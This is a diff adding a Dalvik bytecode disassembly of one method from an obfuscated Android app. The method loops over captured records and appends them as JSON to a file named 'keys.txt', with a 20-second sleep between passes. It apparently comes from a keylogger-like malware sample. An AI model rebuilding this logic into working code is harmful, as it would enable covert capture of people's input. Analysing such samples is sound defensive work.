@@ -1,0 +1,196 @@
+# Lcom/mixio/tosh/aprl/ani/ninere$a;->run()V [access_flags=public]
+#
+# Parameters:
+# local registers: v0...v10
+#
+# - return:void
+
+run-BB@0x0 : [ run-BB@0xa ]
+	0       (00000000) const/4              v0, 1
+	1       (00000002) sput-boolean         v0, Lcom/mixio/tosh/aprl/ani/ninere;->b Z
+	2       (00000006) const/4              v1, 0
+	3       (00000008) const/4              v2, 0
+
+run-BB@0xa : [ run-BB@0x1c run-BB@0x1e2 ]
+	4       (0000000a) sget-object          v3, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	5       (0000000e) invoke-interface     v3, Ljava/util/List;->size()I
+	6       (00000014) move-result          v3
+	7       (00000016) sub-int/2addr        v3, v0
+	8       (00000018) if-gt                v2, v3, +e5
+	a:6b
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x1c : [ run-BB@0x3e run-BB@0x1da ]
+	9       (0000001c) sget-object          v3, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	10      (00000020) invoke-interface     v3, v2, Ljava/util/List;->get(I)Ljava/lang/Object;
+	11      (00000026) move-result-object   v3
+	12      (00000028) check-cast           v3, Lb/b/a/a/e/a;
+	13      (0000002c) iget-object          v3, v3, Lb/b/a/a/e/a;->a Ljava/util/List;
+	14      (00000030) invoke-interface     v3, Ljava/util/List;->size()I
+	15      (00000036) move-result          v3
+	16      (00000038) const/4              v4, 2
+	17      (0000003a) if-lt                v3, v4, +d0
+	a:6b
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x3e : [ run-BB@0x4a run-BB@0x5c ]
+	18      (0000003e) iget-object          v2, v10, Lcom/mixio/tosh/aprl/ani/ninere$a;->a Lcom/mixio/tosh/aprl/ani/ninere;
+	19      (00000042) iget-object          v2, v2, Lcom/mixio/tosh/aprl/ani/ninere;->k Lorg/json/JSONArray;
+	20      (00000046) if-nez               v2, +b
+	a:6b
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x4a : [ run-BB@0x5c ]
+	21      (0000004a) iget-object          v2, v10, Lcom/mixio/tosh/aprl/ani/ninere$a;->a Lcom/mixio/tosh/aprl/ani/ninere;
+	22      (0000004e) new-instance         v3, Lorg/json/JSONArray;
+	23      (00000052) invoke-direct        v3, Lorg/json/JSONArray;-><init>()V
+	24      (00000058) iput-object          v3, v2, Lcom/mixio/tosh/aprl/ani/ninere;->k Lorg/json/JSONArray;
+	a:6b
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x5c : [ run-BB@0x70 run-BB@0x1e2 ]
+	25      (0000005c) sget-object          v2, Lcom/mixio/tosh/aprl/aetn/ate;->e Landroid/content/SharedPreferences;
+	26      (00000060) const-string         v3, 'Keyfi'
+	27      (00000064) invoke-interface     v2, v3, v1, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String; I)I
+	28      (0000006a) move-result          v2
+	29      (0000006c) if-nez               v2, +bb
+
+run-BB@0x70 : [ run-BB@0x8e ]
+	30      (00000070) new-instance         v2, Ljava/io/FileOutputStream;
+	31      (00000074) new-instance         v3, Ljava/io/File;
+	32      (00000078) sget-object          v4, Lcom/mixio/tosh/aprl/aetn/ate;->c Ljava/io/File;
+	33      (0000007c) const-string         v5, 'keys.txt'
+	34      (00000080) invoke-direct        v3, v4, v5, Ljava/io/File;-><init>(Ljava/io/File; Ljava/lang/String;)V
+	35      (00000086) invoke-direct        v2, v3, v0, Ljava/io/FileOutputStream;-><init>(Ljava/io/File; Z)V
+	36      (0000008c) const/4              v3, 0
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0x8e : [ run-BB@0xa0 run-BB@0x142 ]
+	37      (0000008e) sget-object          v4, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	38      (00000092) invoke-interface     v4, Ljava/util/List;->size()I
+	39      (00000098) move-result          v4
+	40      (0000009a) sub-int/2addr        v4, v0
+	41      (0000009c) if-gt                v3, v4, +53
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0xa0 : [ run-BB@0xa2 ]
+	42      (000000a0) const/4              v4, 0
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0xa2 : [ run-BB@0xc4 run-BB@0x13c ]
+	43      (000000a2) sget-object          v5, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	44      (000000a6) invoke-interface     v5, v3, Ljava/util/List;->get(I)Ljava/lang/Object;
+	45      (000000ac) move-result-object   v5
+	46      (000000ae) check-cast           v5, Lb/b/a/a/e/a;
+	47      (000000b2) iget-object          v5, v5, Lb/b/a/a/e/a;->a Ljava/util/List;
+	48      (000000b6) invoke-interface     v5, Ljava/util/List;->size()I
+	49      (000000bc) move-result          v5
+	50      (000000be) sub-int/2addr        v5, v0
+	51      (000000c0) if-gt                v4, v5, +3e
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0xc4 : [ run-BB@0xa2 ]
+	52      (000000c4) iget-object          v5, v10, Lcom/mixio/tosh/aprl/ani/ninere$a;->a Lcom/mixio/tosh/aprl/ani/ninere;
+	53      (000000c8) sget-object          v6, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	54      (000000cc) invoke-interface     v6, v3, Ljava/util/List;->get(I)Ljava/lang/Object;
+	55      (000000d2) move-result-object   v6
+	56      (000000d4) check-cast           v6, Lb/b/a/a/e/a;
+	57      (000000d8) iget-object          v6, v6, Lb/b/a/a/e/a;->d Ljava/lang/String;
+	58      (000000dc) sget-object          v7, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	59      (000000e0) invoke-interface     v7, v3, Ljava/util/List;->get(I)Ljava/lang/Object;
+	60      (000000e6) move-result-object   v7
+	61      (000000e8) check-cast           v7, Lb/b/a/a/e/a;
+	62      (000000ec) iget-object          v7, v7, Lb/b/a/a/e/a;->d Ljava/lang/String;
+	63      (000000f0) sget-object          v8, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	64      (000000f4) invoke-interface     v8, v3, Ljava/util/List;->get(I)Ljava/lang/Object;
+	65      (000000fa) move-result-object   v8
+	66      (000000fc) check-cast           v8, Lb/b/a/a/e/a;
+	67      (00000100) iget-object          v8, v8, Lb/b/a/a/e/a;->b Ljava/util/List;
+	68      (00000104) invoke-interface     v8, v4, Ljava/util/List;->get(I)Ljava/lang/Object;
+	69      (0000010a) move-result-object   v8
+	70      (0000010c) check-cast           v8, Ljava/lang/String;
+	71      (00000110) sget-object          v9, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	72      (00000114) invoke-interface     v9, v3, Ljava/util/List;->get(I)Ljava/lang/Object;
+	73      (0000011a) move-result-object   v9
+	74      (0000011c) check-cast           v9, Lb/b/a/a/e/a;
+	75      (00000120) iget-object          v9, v9, Lb/b/a/a/e/a;->a Ljava/util/List;
+	76      (00000124) invoke-interface     v9, v4, Ljava/util/List;->get(I)Ljava/lang/Object;
+	77      (0000012a) move-result-object   v9
+	78      (0000012c) check-cast           v9, Ljava/lang/String;
+	79      (00000130) invoke-static        v5, v6, v7, v8, v9, Lcom/mixio/tosh/aprl/ani/ninere;->a(Lcom/mixio/tosh/aprl/ani/ninere; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)V
+	80      (00000136) add-int/lit8         v4, v4, 1
+	81      (0000013a) goto                 -4c
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0x13c : [ run-BB@0x8e ]
+	82      (0000013c) add-int/lit8         v3, v3, 1
+	83      (00000140) goto                 -59
+	70:1ab
+	(Ljava/lang/Exception; -> 1ae run-BB@0x1ae)
+
+run-BB@0x142 : [ run-BB@0x1e2 ]
+	84      (00000142) new-instance         v0, Ljava/lang/StringBuilder;
+	85      (00000146) invoke-direct        v0, Ljava/lang/StringBuilder;-><init>()V
+	86      (0000014c) iget-object          v3, v10, Lcom/mixio/tosh/aprl/ani/ninere$a;->a Lcom/mixio/tosh/aprl/ani/ninere;
+	87      (00000150) iget-object          v3, v3, Lcom/mixio/tosh/aprl/ani/ninere;->k Lorg/json/JSONArray;
+	88      (00000154) invoke-virtual       v3, Lorg/json/JSONArray;->toString()Ljava/lang/String;
+	89      (0000015a) move-result-object   v3
+	90      (0000015c) invoke-virtual       v0, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	91      (00000162) const/16             v3, 10
+	92      (00000166) invoke-virtual       v0, v3, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;
+	93      (0000016c) invoke-virtual       v0, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	94      (00000172) move-result-object   v0
+	95      (00000174) invoke-static        v0, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;
+	96      (0000017a) move-result-object   v0
+	97      (0000017c) invoke-virtual       v0, Ljava/lang/String;->getBytes()[B
+	98      (00000182) move-result-object   v0
+	99      (00000184) invoke-virtual       v2, v0, Ljava/io/FileOutputStream;->write([B)V
+	100     (0000018a) iget-object          v0, v10, Lcom/mixio/tosh/aprl/ani/ninere$a;->a Lcom/mixio/tosh/aprl/ani/ninere;
+	101     (0000018e) new-instance         v3, Lorg/json/JSONArray;
+	102     (00000192) invoke-direct        v3, Lorg/json/JSONArray;-><init>()V
+	103     (00000198) iput-object          v3, v0, Lcom/mixio/tosh/aprl/ani/ninere;->k Lorg/json/JSONArray;
+	104     (0000019c) sget-object          v0, Lcom/mixio/tosh/aprl/ani/ninere;->a Ljava/util/List;
+	105     (000001a0) invoke-interface     v0, Ljava/util/List;->clear()V
+	106     (000001a6) invoke-virtual       v2, Ljava/io/FileOutputStream;->close()V
+	107     (000001ac) goto                 +1b
+
+run-BB@0x1ae : [ run-BB@0x1b0 ]
+	108     (000001ae) move-exception       v0
+
+run-BB@0x1b0 : [ run-BB@0x1e2 ]
+	109     (000001b0) new-instance         v2, Ljava/lang/StringBuilder;
+	110     (000001b4) invoke-direct        v2, Ljava/lang/StringBuilder;-><init>()V
+	111     (000001ba) const-string         v3, 'Error '
+	112     (000001be) invoke-virtual       v2, v3, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	113     (000001c4) invoke-virtual       v0, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+	114     (000001ca) move-result-object   v0
+	115     (000001cc) invoke-virtual       v2, v0, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+	116     (000001d2) invoke-virtual       v2, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+	117     (000001d8) goto                 +5
+	1b0:1eb
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x1da : [ run-BB@0xa ]
+	118     (000001da) add-int/lit8         v2, v2, 1
+	119     (000001de) goto/16              -ea
+	1b0:1eb
+	(Ljava/lang/Exception; -> 1ee run-BB@0x1ee)
+
+run-BB@0x1e2 : [ run-BB@0x1f6 ]
+	120     (000001e2) const-wide/16        v2, 20000 # [20000.0]
+	121     (000001e6) invoke-static        v2, v3, Ljava/lang/Thread;->sleep(J)V
+	122     (000001ec) goto                 +5
+
+run-BB@0x1ee : [ run-BB@0x1f6 ]
+	123     (000001ee) move-exception       v0
+	124     (000001f0) invoke-virtual       v0, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
+
+run-BB@0x1f6 : 
+	125     (000001f6) sput-boolean         v1, Lcom/mixio/tosh/aprl/ani/ninere;->b Z
+	126     (000001fa) return-void          
+
